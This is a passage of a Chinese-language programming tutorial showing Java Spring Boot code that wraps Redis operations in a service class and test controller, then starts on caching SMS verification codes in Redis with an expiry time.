class="hljs-selector-tag">Object</span> <span class="hljs-built_in">lIndex</span>(String key, long index);<br><br>    <span class="hljs-comment">// 向 List 结构中添加属性</span><br>    Long <span class="hljs-built_in">lPush</span>(String key, Object value);<br><br>    <span class="hljs-comment">// 向 List 结构中添加属性</span><br>    Long <span class="hljs-built_in">lPush</span>(String key, Object value, long time);<br><br>    <span class="hljs-comment">// 向 List 结构中批量添加属性</span><br>    Long <span class="hljs-built_in">lPushAll</span>(String key, Object... values);<br><br>    <span class="hljs-comment">// 向 List 结构中批量添加属性</span><br>    Long <span class="hljs-built_in">lPushAll</span>(String key, Long time, Object... values);<br><br>    <span class="hljs-comment">// 从 List 结构中移除属性</span><br>    Long <span class="hljs-built_in">lRemove</span>(String key, long count, Object value);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-2-2-RedisServiceImpl-实现类"><a href="#2-1-2-2-RedisServiceImpl-实现类" class="headerlink" title="2.1.2.2. RedisServiceImpl 实现类"></a>2.1.2.2. RedisServiceImpl 实现类</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RedisService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RedisTemplate</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; redisTemplate;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">set</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span> value, long time</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">set</span>(key, value, time, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">set</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span> value</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">set</span>(key, value);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">get</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">del</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">delete</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">del</span>(<span class="hljs-params"><span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; keys</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">delete</span>(keys);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">expire</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long time</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">expire</span>(key, time, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">getExpire</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">getExpire</span>(key, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">SECONDS</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">hasKey</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">hasKey</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">incr</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long delta</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">increment</span>(key, delta);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">decr</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long delta</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">increment</span>(key, -delta);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">hGet</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">get</span>(key, hashKey);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">hSet</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey, <span class="hljs-title class_">Object</span> value, long time</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">put</span>(key, hashKey, value);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">expire</span>(key, time);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">hSet</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey, <span class="hljs-title class_">Object</span> value</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">put</span>(key, hashKey, value);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">hGetAll</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">entries</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">hSetAll</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; map, long time</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">putAll</span>(key, map);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">expire</span>(key, time);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">hSetAll</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; map</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">putAll</span>(key, map);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">hDel</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span>... hashKey</span>) &#123;<br>        redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">delete</span>(key, hashKey);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">hHasKey</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">hasKey</span>(key, hashKey);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">hIncr</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey, <span class="hljs-title class_">Long</span> delta</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">increment</span>(key, hashKey, delta);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">hDecr</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">String</span> hashKey, <span class="hljs-title class_">Long</span> delta</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForHash</span>().<span class="hljs-title function_">increment</span>(key, hashKey, -delta);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">sMembers</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">members</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">sAdd</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span>... values</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">add</span>(key, values);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">sAdd</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long time, <span class="hljs-title class_">Object</span>... values</span>) &#123;<br>        <span class="hljs-title class_">Long</span> count = redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">add</span>(key, values);<br>        <span class="hljs-title function_">expire</span>(key, time);<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">sIsMember</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span> value</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">isMember</span>(key, value);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">sSize</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">size</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">sRemove</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span>... values</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForSet</span>().<span class="hljs-title function_">remove</span>(key, values);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">lRange</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long start, long end</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">range</span>(key, start, end);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lSize</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">size</span>(key);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">lIndex</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long index</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">index</span>(key, index);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lPush</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span> value</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPush</span>(key, value);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lPush</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span> value, long time</span>) &#123;<br>        <span class="hljs-title class_">Long</span> index = redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPush</span>(key, value);<br>        <span class="hljs-title function_">expire</span>(key, time);<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lPushAll</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Object</span>... values</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPushAll</span>(key, values);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lPushAll</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, <span class="hljs-title class_">Long</span> time, <span class="hljs-title class_">Object</span>... values</span>) &#123;<br>        <span class="hljs-title class_">Long</span> count = redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">rightPushAll</span>(key, values);<br>        <span class="hljs-title function_">expire</span>(key, time);<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Long</span> <span class="hljs-title function_">lRemove</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> key, long count, <span class="hljs-title class_">Object</span> value</span>) &#123;<br>        <span class="hljs-keyword">return</span> redisTemplate.<span class="hljs-title function_">opsForList</span>().<span class="hljs-title function_">remove</span>(key, count, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-3-Controller-执行操作"><a href="#2-1-3-Controller-执行操作" class="headerlink" title="2.1.3. Controller 执行操作"></a>2.1.3. Controller 执行操作</h5><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@auther</span> macrozheng</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@description</span> Redis测试Controller</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2020/3/3</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/macrozheng</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Api(tags = <span class="hljs-string">&quot;RedisController&quot;</span>, description = <span class="hljs-string">&quot;Redis测试&quot;</span>)</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/redis&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RedisService redisService;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> PmsBrandService brandService;<br><br>    <span class="hljs-meta">@ApiOperation(<span class="hljs-string">&quot;测试简单缓存&quot;</span>)</span><br>    <span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">&quot;/simpleTest&quot;</span>, method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> CommonResult&lt;PmsBrand&gt; simpleTest() &#123;<br>        List&lt;PmsBrand&gt; brandList = brandService.list(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>);<br>        PmsBrand brand = brandList.<span class="hljs-keyword">get</span>(<span class="hljs-number">0</span>);<br>        String key = <span class="hljs-string">&quot;redis:simple:&quot;</span> + brand.getId();<br>        redisService.<span class="hljs-keyword">set</span>(key, brand);<br>        PmsBrand cacheBrand = (PmsBrand) redisService.<span class="hljs-keyword">get</span>(key);<br>        <span class="hljs-keyword">return</span> CommonResult.success(cacheBrand);<br>    &#125;<br><br>    <span class="hljs-meta">@ApiOperation(<span class="hljs-string">&quot;测试 Hash 结构的缓存&quot;</span>)</span><br>    <span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">&quot;/hashTest&quot;</span>, method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> CommonResult&lt;PmsBrand&gt; hashTest() &#123;<br>        List&lt;PmsBrand&gt; brandList = brandService.list(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>);<br>        PmsBrand brand = brandList.<span class="hljs-keyword">get</span>(<span class="hljs-number">0</span>);<br>        String key = <span class="hljs-string">&quot;redis:hash:&quot;</span> + brand.getId();<br>        Map&lt;String, Object&gt; value = BeanUtil.beanToMap(brand);<br>        redisService.hSetAll(key, value);<br>        Map&lt;Object, Object&gt; cacheValue = redisService.hGetAll(key);<br>        PmsBrand cacheBrand = BeanUtil.toBean(cacheValue, PmsBrand.<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">return</span> CommonResult.success(cacheBrand);<br>    &#125;<br><br>    <span class="hljs-meta">@ApiOperation(<span class="hljs-string">&quot;测试 Set 结构的缓存&quot;</span>)</span><br>    <span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">&quot;/setTest&quot;</span>, method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> CommonResult&lt;Set&lt;Object&gt;&gt; setTest() &#123;<br>        List&lt;PmsBrand&gt; brandList = brandService.list(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>);<br>        String key = <span class="hljs-string">&quot;redis:set:all&quot;</span>;<br>        redisService.sAdd(key, (Object[]) ArrayUtil.toArray(brandList, PmsBrand.<span class="hljs-keyword">class</span>));<br>        redisService.sRemove(key, brandList.<span class="hljs-keyword">get</span>(<span class="hljs-number">0</span>));<br>        Set&lt;Object&gt; cachedBrandList = redisService.sMembers(key);<br>        <span class="hljs-keyword">return</span> CommonResult.success(cachedBrandList);<br>    &#125;<br><br>    <span class="hljs-meta">@ApiOperation(<span class="hljs-string">&quot;测试 List 结构的缓存&quot;</span>)</span><br>    <span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">&quot;/listTest&quot;</span>, method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> CommonResult&lt;List&lt;Object&gt;&gt; listTest() &#123;<br>        List&lt;PmsBrand&gt; brandList = brandService.list(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>);<br>        String key = <span class="hljs-string">&quot;redis:list:all&quot;</span>;<br>        redisService.lPushAll(key, (Object[]) ArrayUtil.toArray(brandList, PmsBrand.<span class="hljs-keyword">class</span>));<br>        redisService.lRemove(key, <span class="hljs-number">1</span>, brandList.<span class="hljs-keyword">get</span>(<span class="hljs-number">0</span>));<br>        List&lt;Object&gt; cachedBrandList = redisService.lRange(key, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">return</span> CommonResult.success(cachedBrandList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-2-实现验证码逻辑"><a href="#2-2-实现验证码逻辑" class="headerlink" title="2.2. 实现验证码逻辑"></a>2.2. 实现验证码逻辑</h4><h5 id="2-2-1-实现验证码逻辑概述"><a href="#2-2-1-实现验证码逻辑概述" class="headerlink" title="2.2.1. 实现验证码逻辑概述"></a>2.2.1. 实现验证码逻辑概述</h5><p>以短信验证码的存储与校验为例，具体流程如下：系统生成验证码后，将其与自定义的 Redis key 前缀及用户手机号拼接生成完整的 Redis key，并将验证码作为 value 存入 Redis，同时设置指定的过期时间（例如 120 秒）。在验证码校验环节，根据手机号构造出 Redis key，获取存储的验证码值，与用户提供的验证码进行比对判断。</p><hr><h5 id="2-2-2-UmsMemberService-接口"><a href="#2-2-2-UmsMemberService-接口" class="headerlink" title="2.2.2. UmsMemberService 接口"></a>2.2.2. UmsMemberService 接口</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> interface UmsMemberService &#123;<br><br>    <span class="hljs-comment">// 生成验证码</span><br>    <span class="hljs-function">CommonResult <span class="hljs-title">generateAuthCode</span><span class="hljs-params">(<span class="hljs-type">String</span> telephone)</span></span>;<br><br><span class="hljs-comment">// 判断验证码和手机号码是否匹配</span><br>    <span class="hljs-function">CommonResult <span class="hljs-title">verifyAuthCode</span><span class="hljs-params">(<span class="hljs-type">String</span> telephone, <span class="hljs-type">String</span> authCode)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-2-3-UmsMemberServiceImpl-实现类"><a href="#2-2-3-UmsMemberServiceImpl-实现类" class="headerlink" title="2.2.3. UmsMemberServiceImpl 实现类"></a>2.2.3. UmsMemberServiceImpl 实现类</h5><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 